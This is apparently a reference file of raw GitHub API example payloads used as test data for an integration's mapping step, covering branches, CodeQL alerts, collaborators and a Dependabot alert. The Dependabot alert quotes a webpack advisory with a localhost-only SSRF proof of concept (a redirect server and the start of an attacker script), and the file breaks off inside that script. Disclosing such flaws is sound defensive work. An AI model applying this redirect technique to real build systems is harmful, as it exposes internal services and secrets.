# github-ocean raw data examples

Raw data examples for `test_integration_mapping` when `get_integration_kinds_with_examples` returns empty on a fresh install for the `github-ocean` integration. See SKILL.md Step 7 for when to use these. Each kind may include multiple example payloads.

### branch

#### a.json

```json
{
	"name": "copilot/add-http-client-file",
	"commit": {
		"sha": "4eefbb2beda5fcc12fed45018c91b8477c89a713",
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo/commits/4eefbb2beda5fcc12fed45018c91b8477c89a713"
	},
	"protected": false,
	"protection": {
		"enabled": false,
		"required_status_checks": {
			"enforcement_level": "off",
			"contexts": [],
			"checks": []
		}
	},
	"protection_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/branches/copilot/add-http-client-file/protection",
	"__is_default_branch": false,
	"__repository": "small-repo",
	"__repository_object": {
		"id": 1005028258,
		"node_id": "R_kgDOO-eDog",
		"name": "small-repo",
		"full_name": "port-gh-app-dev/small-repo",
		"private": false,
		"owner": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"html_url": "https://github.com/port-gh-app-dev/small-repo",
		"description": null,
		"fork": false,
		"url": "https://api.github.com/repos/port-gh-app-dev/small-repo",
		"forks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/forks",
		"keys_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/keys{/key_id}",
		"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/collaborators{/collaborator}",
		"teams_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/teams",
		"hooks_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/hooks",
		"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/events{/number}",
		"events_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/events",
		"assignees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/assignees{/user}",
		"branches_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/branches{/branch}",
		"tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/tags",
		"blobs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/blobs{/sha}",
		"git_tags_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/tags{/sha}",
		"git_refs_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/refs{/sha}",
		"trees_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/trees{/sha}",
		"statuses_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/statuses/{sha}",
		"languages_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/languages",
		"stargazers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/stargazers",
		"contributors_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contributors",
		"subscribers_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscribers",
		"subscription_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/subscription",
		"commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/commits{/sha}",
		"git_commits_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/git/commits{/sha}",
		"comments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/comments{/number}",
		"issue_comment_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues/comments{/number}",
		"contents_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/contents/{+path}",
		"compare_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/compare/{base}...{head}",
		"merges_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/merges",
		"archive_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/{archive_format}{/ref}",
		"downloads_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/downloads",
		"issues_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/issues{/number}",
		"pulls_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/pulls{/number}",
		"milestones_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/milestones{/number}",
		"notifications_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/notifications{?since,all,participating}",
		"labels_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/labels{/name}",
		"releases_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/releases{/id}",
		"deployments_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/deployments",
		"created_at": "2025-06-19T14:51:39Z",
		"updated_at": "2026-03-17T17:03:59Z",
		"pushed_at": "2026-03-17T17:03:55Z",
		"git_url": "git://github.com/port-gh-app-dev/small-repo.git",
		"ssh_url": "git@github.com:port-gh-app-dev/small-repo.git",
		"clone_url": "https://github.com/port-gh-app-dev/small-repo.git",
		"svn_url": "https://github.com/port-gh-app-dev/small-repo",
		"homepage": null,
		"size": 98,
		"stargazers_count": 0,
		"watchers_count": 0,
		"language": "Python",
		"has_issues": true,
		"has_projects": true,
		"has_downloads": true,
		"has_wiki": true,
		"has_pages": false,
		"has_discussions": false,
		"forks_count": 0,
		"mirror_url": null,
		"archived": false,
		"disabled": false,
		"open_issues_count": 2,
		"license": null,
		"allow_forking": true,
		"is_template": false,
		"web_commit_signoff_required": false,
		"has_pull_requests": true,
		"pull_request_creation_policy": "all",
		"topics": [],
		"visibility": "public",
		"forks": 0,
		"open_issues": 2,
		"watchers": 0,
		"default_branch": "main",
		"permissions": {
			"admin": true,
			"maintain": true,
			"push": true,
			"triage": true,
			"pull": true
		},
		"security_and_analysis": {
			"secret_scanning": {
				"status": "enabled"
			},
			"secret_scanning_push_protection": {
				"status": "disabled"
			},
			"dependabot_security_updates": {
				"status": "enabled"
			},
			"secret_scanning_non_provider_patterns": {
				"status": "enabled"
			},
			"secret_scanning_ai_detection": {
				"status": "disabled"
			},
			"secret_scanning_validity_checks": {
				"status": "enabled"
			},
			"secret_scanning_delegated_alert_dismissal": {
				"status": "disabled"
			}
		},
		"custom_properties": {
			"business_criticality": "low",
			"code_maturity": "Basic",
			"engineering_excellence": "Needs Improvement",
			"githubRepository_security_posture": "Basic",
			"production_readiness": "Development"
		}
	},
	"__organization": "port-gh-app-dev"
}
```

#### b.json

```json
{
	"name": "main",
	"commit": {
		"sha": "ea36a236fc25fe83ff1b6552c731e7ef56c3db90",
		"node_id": "C_kwDOO-iDDNoAKGVhMzZhMjM2ZmMyNWZlODNmZjFiNjU1MmM3MzFlN2VmNTZjM2RiOTA",
		"commit": {
			"author": {
				"name": "Melody Daniel",
				"email": "melodyogonna@gmail.com",
				"date": "2025-06-20T12:42:20Z"
			},
			"committer": {
				"name": "Melody Daniel",
				"email": "melodyogonna@gmail.com",
				"date": "2025-06-20T12:42:20Z"
			},
			"message": "Add dummy_file_df085cf9-9502-461f-96af-2cd96f9f4b67.txt",
			"tree": {
				"sha": "d1e944dd64c105a2eb50af9efc0db0f97037b20d",
				"url": "https://api.github.com/repos/port-gh-app-dev/large-repo/git/trees/d1e944dd64c105a2eb50af9efc0db0f97037b20d"
			},
			"url": "https://api.github.com/repos/port-gh-app-dev/large-repo/git/commits/ea36a236fc25fe83ff1b6552c731e7ef56c3db90",
			"comment_count": 0,
			"verification": {
				"verified": false,
				"reason": "unsigned",
				"signature": null,
				"payload": null,
				"verified_at": null
			}
		},
		"url": "https://api.github.com/repos/port-gh-app-dev/large-repo/commits/ea36a236fc25fe83ff1b6552c731e7ef56c3db90",
		"html_url": "https://github.com/port-gh-app-dev/large-repo/commit/ea36a236fc25fe83ff1b6552c731e7ef56c3db90",
		"comments_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/commits/ea36a236fc25fe83ff1b6552c731e7ef56c3db90/comments",
		"author": {
			"login": "melodyogonna",
			"id": 24739630,
			"node_id": "MDQ6VXNlcjI0NzM5NjMw",
			"avatar_url": "https://avatars.githubusercontent.com/u/24739630?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/melodyogonna",
			"html_url": "https://github.com/melodyogonna",
			"followers_url": "https://api.github.com/users/melodyogonna/followers",
			"following_url": "https://api.github.com/users/melodyogonna/following{/other_user}",
			"gists_url": "https://api.github.com/users/melodyogonna/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/melodyogonna/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/melodyogonna/subscriptions",
			"organizations_url": "https://api.github.com/users/melodyogonna/orgs",
			"repos_url": "https://api.github.com/users/melodyogonna/repos",
			"events_url": "https://api.github.com/users/melodyogonna/events{/privacy}",
			"received_events_url": "https://api.github.com/users/melodyogonna/received_events",
			"type": "User",
			"user_view_type": "public",
			"site_admin": false
		},
		"committer": {
			"login": "melodyogonna",
			"id": 24739630,
			"node_id": "MDQ6VXNlcjI0NzM5NjMw",
			"avatar_url": "https://avatars.githubusercontent.com/u/24739630?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/melodyogonna",
			"html_url": "https://github.com/melodyogonna",
			"followers_url": "https://api.github.com/users/melodyogonna/followers",
			"following_url": "https://api.github.com/users/melodyogonna/following{/other_user}",
			"gists_url": "https://api.github.com/users/melodyogonna/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/melodyogonna/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/melodyogonna/subscriptions",
			"organizations_url": "https://api.github.com/users/melodyogonna/orgs",
			"repos_url": "https://api.github.com/users/melodyogonna/repos",
			"events_url": "https://api.github.com/users/melodyogonna/events{/privacy}",
			"received_events_url": "https://api.github.com/users/melodyogonna/received_events",
			"type": "User",
			"user_view_type": "public",
			"site_admin": false
		},
		"parents": [
			{
				"sha": "7610fc3494db8c448087f737860cb916a5c8f2bf",
				"url": "https://api.github.com/repos/port-gh-app-dev/large-repo/commits/7610fc3494db8c448087f737860cb916a5c8f2bf",
				"html_url": "https://github.com/port-gh-app-dev/large-repo/commit/7610fc3494db8c448087f737860cb916a5c8f2bf"
			}
		]
	},
	"_links": {
		"self": "https://api.github.com/repos/port-gh-app-dev/large-repo/branches/main",
		"html": "https://github.com/port-gh-app-dev/large-repo/tree/main"
	},
	"protected": false,
	"protection": {
		"enabled": false,
		"required_status_checks": {
			"enforcement_level": "off",
			"contexts": [],
			"checks": []
		}
	},
	"protection_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/branches/main/protection",
	"__repository": "large-repo",
	"__repository_object": {
		"id": 1005093644,
		"node_id": "R_kgDOO-iDDA",
		"name": "large-repo",
		"full_name": "port-gh-app-dev/large-repo",
		"private": false,
		"owner": {
			"login": "port-gh-app-dev",
			"id": 216844958,
			"node_id": "O_kgDODOzKng",
			"avatar_url": "https://avatars.githubusercontent.com/u/216844958?v=4",
			"gravatar_id": "",
			"url": "https://api.github.com/users/port-gh-app-dev",
			"html_url": "https://github.com/port-gh-app-dev",
			"followers_url": "https://api.github.com/users/port-gh-app-dev/followers",
			"following_url": "https://api.github.com/users/port-gh-app-dev/following{/other_user}",
			"gists_url": "https://api.github.com/users/port-gh-app-dev/gists{/gist_id}",
			"starred_url": "https://api.github.com/users/port-gh-app-dev/starred{/owner}{/repo}",
			"subscriptions_url": "https://api.github.com/users/port-gh-app-dev/subscriptions",
			"organizations_url": "https://api.github.com/users/port-gh-app-dev/orgs",
			"repos_url": "https://api.github.com/users/port-gh-app-dev/repos",
			"events_url": "https://api.github.com/users/port-gh-app-dev/events{/privacy}",
			"received_events_url": "https://api.github.com/users/port-gh-app-dev/received_events",
			"type": "Organization",
			"user_view_type": "public",
			"site_admin": false
		},
		"html_url": "https://github.com/port-gh-app-dev/large-repo",
		"description": null,
		"fork": false,
		"url": "https://api.github.com/repos/port-gh-app-dev/large-repo",
		"forks_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/forks",
		"keys_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/keys{/key_id}",
		"collaborators_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/collaborators{/collaborator}",
		"teams_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/teams",
		"hooks_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/hooks",
		"issue_events_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/issues/events{/number}",
		"events_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/events",
		"assignees_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/assignees{/user}",
		"branches_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/branches{/branch}",
		"tags_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/tags",
		"blobs_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/git/blobs{/sha}",
		"git_tags_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/git/tags{/sha}",
		"git_refs_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/git/refs{/sha}",
		"trees_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/git/trees{/sha}",
		"statuses_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/statuses/{sha}",
		"languages_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/languages",
		"stargazers_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/stargazers",
		"contributors_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/contributors",
		"subscribers_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/subscribers",
		"subscription_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/subscription",
		"commits_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/commits{/sha}",
		"git_commits_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/git/commits{/sha}",
		"comments_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/comments{/number}",
		"issue_comment_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/issues/comments{/number}",
		"contents_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/contents/{+path}",
		"compare_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/compare/{base}...{head}",
		"merges_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/merges",
		"archive_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/{archive_format}{/ref}",
		"downloads_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/downloads",
		"issues_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/issues{/number}",
		"pulls_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/pulls{/number}",
		"milestones_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/milestones{/number}",
		"notifications_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/notifications{?since,all,participating}",
		"labels_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/labels{/name}",
		"releases_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/releases{/id}",
		"deployments_url": "https://api.github.com/repos/port-gh-app-dev/large-repo/deployments",
		"created_at": "2025-06-19T16:51:39Z",
		"updated_at": "2025-06-20T12:42:23Z",
		"pushed_at": "2025-06-20T12:42:20Z",
		"git_url": "git://github.com/port-gh-app-dev/large-repo.git",
		"ssh_url": "git@github.com:port-gh-app-dev/large-repo.git",
		"clone_url": "https://github.com/port-gh-app-dev/large-repo.git",
		"svn_url": "https://github.com/port-gh-app-dev/large-repo",
		"homepage": null,
		"size": 1134663,
		"stargazers_count": 0,
		"watchers_count": 0,
		"language": null,
		"has_issues": true,
		"has_projects": true,
		"has_downloads": true,
		"has_wiki": true,
		"has_pages": false,
		"has_discussions": false,
		"forks_count": 0,
		"mirror_url": null,
		"archived": false,
		"disabled": false,
		"open_issues_count": 0,
		"license": null,
		"allow_forking": true,
		"is_template": false,
		"web_commit_signoff_required": false,
		"has_pull_requests": true,
		"pull_request_creation_policy": "all",
		"topics": [],
		"visibility": "public",
		"forks": 0,
		"open_issues": 0,
		"watchers": 0,
		"default_branch": "main",
		"permissions": {
			"admin": true,
			"maintain": true,
			"push": true,
			"triage": true,
			"pull": true
		},
		"security_and_analysis": {
			"secret_scanning": {
				"status": "enabled"
			},
			"secret_scanning_push_protection": {
				"status": "disabled"
			},
			"dependabot_security_updates": {
				"status": "disabled"
			},
			"secret_scanning_non_provider_patterns": {
				"status": "enabled"
			},
			"secret_scanning_ai_detection": {
				"status": "disabled"
			},
			"secret_scanning_validity_checks": {
				"status": "enabled"
			},
			"secret_scanning_delegated_alert_dismissal": {
				"status": "disabled"
			}
		},
		"custom_properties": {}
	},
	"__organization": "port-gh-app-dev"
}
```

### code-scanning-alerts

#### a.json

```json
{
	"number": 3,
	"created_at": "2025-09-26T14:58:48Z",
	"updated_at": "2025-09-26T15:18:09Z",
	"url": "https://api.github.com/repos/port-gh-app-dev/small-repo/code-scanning/alerts/3",
	"html_url": "https://github.com/port-gh-app-dev/small-repo/security/code-scanning/3",
	"state": "open",
	"fixed_at": null,
	"dismissed_by": null,
	"dismissed_at": null,
	"dismissed_reason": null,
	"dismissed_comment": null,
	"rule": {
		"id": "actions/missing-workflow-permissions",
		"severity": "warning",
		"description": "Workflow does not contain permissions",
		"name": "actions/missing-workflow-permissions",
		"tags": [
			"actions",
			"external/cwe/cwe-275",
			"maintainability",
			"security"
		],
		"full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
		"help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\nNote that this query cannot check whether the organization or repository token settings are set to read-only. However, even if they are, it is recommended to define explicit permissions (`contents: read` and `packages: read` are equivalent to the read-only default) so that (a) the actual needs of the workflow are documented, and (b) the permissions will remain restricted if the default is subsequently changed, or the workflow is copied to a different repository or organization.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
		"security_severity_level": "medium"
	},
	"tool": {
		"name": "CodeQL",
		"guid": null,
		"version": "2.24.0"
	},
	"most_recent_instance": {
		"ref": "refs/heads/main",
		"analysis_key": "dynamic/github-code-scanning/codeql:analyze",
		"environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-la[REDACTED]\\\"]\"}",
		"category": "/language:actions",
		"state": "open",
		"commit_sha": "55619858bf20a10d0c5768d8e6c3b344a1138be4",
		"message": {
			"text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{}}"
		},
		"location": {
			"path": ".github/workflows/port-kafka.yaml",
			"start_line": 8,
			"end_line": 27,
			"start_column": 5,
			"end_column": 99
		},
		"classifications": []
	},
	"instances_url": "https://api.github.com/repos/port-gh-app-dev/small-repo/code-scanning/alerts/3/instances",
	"dismissal_approved_by": null,
	"assignees": [],
	"__repository": "small-repo",
	"__organization": "port-gh-app-dev"
}
```

#### b.json

```json
{
	"number": 4,
	"created_at": "2025-09-09T19:04:54Z",
	"updated_at": "2025-09-09T19:04:54Z",
	"url": "https://api.github.com/repos/port-gh-app-dev/perf-[REDACTED]-repo-01ad96e1/code-scanning/alerts/4",
	"html_url": "https://github.com/port-gh-app-dev/perf-[REDACTED]-repo-01ad96e1/security/code-scanning/4",
	"state": "open",
	"fixed_at": null,
	"dismissed_by": null,
	"dismissed_at": null,
	"dismissed_reason": null,
	"dismissed_comment": null,
	"rule": {
		"id": "actions/missing-workflow-permissions",
		"severity": "warning",
		"description": "Workflow does not contain permissions",
		"name": "actions/missing-workflow-permissions",
		"tags": [
			"actions",
			"external/cwe/cwe-275",
			"maintainability",
			"security"
		],
		"full_description": "Workflows should contain explicit permissions to restrict the scope of the default GITHUB_TOKEN.",
		"help": "## Overview\n\nIf a GitHub Actions job or workflow has no explicit permissions set, then the repository permissions are used. Repositories created under organizations inherit the organization permissions. The organizations or repositories created before February 2023 have the default permissions set to read-write. Often these permissions do not adhere to the principle of least privilege and can be reduced to read-only, leaving the `write` permission only to a specific types as `issues: write` or `pull-requests: write`.\n\nNote that this query cannot check whether the organization or repository token settings are set to read-only. However, even if they are, it is recommended to define explicit permissions (`contents: read` and `packages: read` are equivalent to the read-only default) so that (a) the actual needs of the workflow are documented, and (b) the permissions will remain restricted if the default is subsequently changed, or the workflow is copied to a different repository or organization.\n\n## Recommendation\n\nAdd the `permissions` key to the job or the root of workflow (in this case it is applied to all jobs in the workflow that do not have their own `permissions` key) and assign the least privileges required to complete the task.\n\n## Example\n\n### Incorrect Usage\n\n```yaml\nname: \"My workflow\"\n# No permissions block\n```\n\n### Correct Usage\n\n```yaml\nname: \"My workflow\"\npermissions:\n  contents: read\n  pull-requests: write\n```\n\nor\n\n```yaml\njobs:\n  my-job:\n    permissions:\n      contents: read\n      pull-requests: write\n```\n\n## References\n\n- GitHub Docs: [Assigning permissions to jobs](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/assigning-permissions-to-jobs).\n",
		"security_severity_level": "medium"
	},
	"tool": {
		"name": "CodeQL",
		"guid": null,
		"version": "2.24.1"
	},
	"most_recent_instance": {
		"ref": "refs/heads/main",
		"analysis_key": "dynamic/github-code-scanning/codeql:analyze",
		"environment": "{\"build-mode\":\"none\",\"category\":\"/language:actions\",\"language\":\"actions\",\"runner\":\"[\\\"ubuntu-la[REDACTED]\\\"]\"}",
		"category": "/language:actions",
		"state": "open",
		"commit_sha": "eec5819df85585dd1e002fb58ecd44deee65b3ac",
		"message": {
			"text": "Actions job or workflow does not limit the permissions of the GITHUB_TOKEN. Consider setting an explicit permissions block, using the following as a minimal starting point: {{contents: read}}"
		},
		"location": {
			"path": ".github/workflows/ci_workflow_1_f0ya.yml",
			"start_line": 7,
			"end_line": 13,
			"start_column": 5,
			"end_column": 45
		},
		"classifications": []
	},
	"instances_url": "https://api.github.com/repos/port-gh-app-dev/perf-[REDACTED]-repo-01ad96e1/code-scanning/alerts/4/instances",
	"dismissal_approved_by": null,
	"assignees": [],
	"__repository": "perf-[REDACTED]-repo-01ad96e1",
	"__organization": "port-gh-app-dev"
}
```

### collaborator

#### a.json

```json
{
	"login": "johndoe",
	"id": 24245630,
	"node_id": "MDQ6VXNlcjI0NzM5NjMw",
	"avatar_url": "https://avatars.githubusercontent.com/u/24739630?v=4",
	"gravatar_id": "",
	"url": "https://api.github.com/users/johndoe",
	"html_url": "https://github.com/johndoe",
	"followers_url": "https://api.github.com/users/johndoe/followers",
	"following_url": "https://api.github.com/users/johndoe/following{/other_user}",
	"gists_url": "https://api.github.com/users/johndoe/gists{/gist_id}",
	"starred_url": "https://api.github.com/users/johndoe/starred{/owner}{/repo}",
	"subscriptions_url": "https://api.github.com/users/johndoe/subscriptions",
	"organizations_url": "https://api.github.com/users/johndoe/orgs",
	"repos_url": "https://api.github.com/users/johndoe/repos",
	"events_url": "https://api.github.com/users/johndoe/events{/privacy}",
	"received_events_url": "https://api.github.com/users/johndoe/received_events",
	"type": "User",
	"user_view_type": "public",
	"site_admin": false,
	"permissions": {
		"admin": true,
		"maintain": true,
		"push": true,
		"triage": true,
		"pull": true
	},
	"role_name": "admin",
	"__repository": "perf-[REDACTED]-repo-adfd348e"
}
```

#### b.json

```json
{
	"login": "melodyogonna",
	"id": 24739630,
	"node_id": "MDQ6VXNlcjI0NzM5NjMw",
	"avatar_url": "https://avatars.githubusercontent.com/u/24739630?v=4",
	"gravatar_id": "",
	"url": "https://api.github.com/users/melodyogonna",
	"html_url": "https://github.com/melodyogonna",
	"followers_url": "https://api.github.com/users/melodyogonna/followers",
	"following_url": "https://api.github.com/users/melodyogonna/following{/other_user}",
	"gists_url": "https://api.github.com/users/melodyogonna/gists{/gist_id}",
	"starred_url": "https://api.github.com/users/melodyogonna/starred{/owner}{/repo}",
	"subscriptions_url": "https://api.github.com/users/melodyogonna/subscriptions",
	"organizations_url": "https://api.github.com/users/melodyogonna/orgs",
	"repos_url": "https://api.github.com/users/melodyogonna/repos",
	"events_url": "https://api.github.com/users/melodyogonna/events{/privacy}",
	"received_events_url": "https://api.github.com/users/melodyogonna/received_events",
	"type": "User",
	"user_view_type": "public",
	"site_admin": false,
	"permissions": {
		"admin": true,
		"maintain": true,
		"push": true,
		"triage": true,
		"pull": true
	},
	"role_name": "admin",
	"__repository": "perf-[REDACTED]-repo-adfd348e"
}
```

### dependabot-alert

#### a.json

```json
{
	"number": 114,
	"state": "fixed",
	"dependency": {
		"package": {
			"ecosystem": "npm",
			"name": "webpack"
		},
		"manifest_path": "package-lock.json",
		"scope": "development",
		"relationship": "direct"
	},
	"security_advisory": {
		"ghsa_id": "GHSA-38r7-794h-5758",
		"cve_id": "CVE-2025-68157",
		"summary": "webpack buildHttp HttpUriPlugin allowedUris bypass via HTTP redirects → SSRF + cache persistence",
		"description": "### Summary\nWhen `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) enforces `allowedUris` only for the **initial** URL, but **does not re-validate `allowedUris` after following HTTP 30x redirects**. As a result, an import that appears restricted to a trusted allow-list can be redirected to **HTTP(S) URLs outside the allow-list**. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion in build outputs** (redirected content is treated as module source and bundled). In my reproduction, the internal response is also persisted in the buildHttp cache.\n\n### Details\nIn the HTTP scheme resolver, the allow-list check (`allowedUris`) is performed when metadata/info is created for the original request (via `getInfo()`), but the content-fetch path follows redirects by resolving the `Location` URL without re-checking whether the redirected URL is within `allowedUris`.\n\nPractical consequence: if an “allowed” host/path can return a 302 (or has an open redirect), it can point to an external URL or an internal-only URL (SSRF). The redirected response is consumed as module content, bundled, and can be cached. If the redirect target is attacker-controlled, this can potentially result in attacker-controlled JavaScript being bundled and later executed when the resulting bundle runs.\n\n**Figure 1 (evidence screenshot):** left pane shows the allowed host issuing a 302 redirect to `http://127.0.0.1:9100/secret.js`; right pane shows the build output confirming allow-list bypass and that the secret appears in the bundle and buildHttp cache.\n\n<img width=\"1648\" height=\"461\" alt=\"image\" src=\"https://github.com/user-attachments/assets/bb25f3ff-1919-49f9-951b-ad50bf0c7524\" />\n\n\n### PoC\nThis PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely.\n\n#### 1) Setup\n```bash\nmkdir split-ssrf-poc && cd split-ssrf-poc\nnpm init -y\nnpm i -D webpack webpack-cli\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst http = require(\"http\");\nconst url = require(\"url\");\n\nconst allowedPort = 9000;\nconst internalPort = 9100;\n\nconst internalUrlDefault = `http://127.0.0.1:${internalPort}/secret.js`;\nconst secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;\nconst internalPayload =\n  `export const secret = ${JSON.stringify(secret)};\\n` +\n  `export default \"ok\";\\n`;\n\nfunction start(port, handler) {\n  return new Promise(resolve => {\n    const s = http.createServer(handler);\n    s.listen(port, \"127.0.0.1\", () => resolve(s));\n  });\n}\n\n(async () => {\n  // Internal-only service (SSRF target)\n  await start(internalPort, (req, res) => {\n    if (req.url === \"/secret.js\") {\n      res.statusCode = 200;\n      res.setHeader(\"Content-Type\", \"application/javascript; charset=utf-8\");\n      res.end(internalPayload);\n      console.log(`[internal] 200 /secret.js served (secret=${secret})`);\n      return;\n    }\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  // Allowed host (redirector)\n  await start(allowedPort, (req, res) => {\n    const parsed = url.parse(req.url, true);\n\n    if (parsed.pathname === \"/redirect.js\") {\n      const to = parsed.query.to || internalUrlDefault;\n\n      // Safety guard: only allow redirecting to localhost internal service in this PoC\n      if (!to.startsWith(`http://127.0.0.1:${internalPort}/`)) {\n        res.statusCode = 400;\n        res.end(\"to must be internal-only in this PoC\");\n        console.log(`[allowed] blocked redirect to: ${to}`);\n        return;\n      }\n\n      res.statusCode = 302;\n      res.setHeader(\"Location\", to);\n      res.end(\"redirecting\");\n      console.log(`[allowed] 302 /redirect.js -> ${to}`);\n      return;\n    }\n\n    res.statusCode = 404;\n    res.end(\"not found\");\n  });\n\n  console.log(`\\nServer running:`);\n  console.log(`- allowed host:  http://127.0.0.1:${allowedPort}/redirect.js`);\n  console.log(`- internal-only: http://127.0.0.1:${internalPort}/secret.js`);\n})();\n```\n\n#### 3) Create attacker.js\n```js\n#!/usr/bin/env node\n\"use strict\";\n\nconst path = require(\"path\");\nconst os = require(\"os\");\nconst fs = require(\"fs/promises\");\nconst webpack = require(\"webpack\");\nconst webpackPkg = 